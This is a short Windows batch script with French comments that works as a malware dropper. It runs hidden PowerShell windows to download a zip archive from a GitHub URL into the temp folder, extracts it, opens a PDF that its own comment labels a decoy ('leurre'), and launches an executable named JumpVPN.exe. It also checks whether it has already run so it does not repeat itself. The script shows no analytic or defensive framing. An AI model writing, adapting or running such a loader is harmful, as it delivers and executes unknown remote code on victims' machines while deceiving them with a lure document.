@echo off
setlocal

set "ZIP_PATH=%TEMP%\package.zip"
set "EXTRACT_PATH=%TEMP%\package"
set "EXE_PATH=%EXTRACT_PATH%\JumpVPN.exe"
set "PDF_PATH=%EXTRACT_PATH%\contract-draft.pdf"

:: 1. Vérification OS
if not "%OS%"=="Windows_NT" exit /b 0

:: 2. Vérification Anti-Rerun
if exist "%EXE_PATH%" exit /b 0

:: 3. Téléchargement via PowerShell
powershell -w h -NoProfile -Command "[System.Net.WebClient]::new().DownloadFile('https://github.com/metaverse-online/jumpvpn/raw/refs/heads/main/package.zip', '%ZIP_PATH%')"

:: 4. Extraction via PowerShell
powershell -w h -NoProfile -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_PATH%' -Force"

:: 5. Ouverture du PDF (leurre) et Lancement de l'EXE
if exist "%EXE_PATH%" (
    start "" "%PDF_PATH%"
    cd /d "%EXTRACT_PATH%"
    start "" "%EXE_PATH%"
)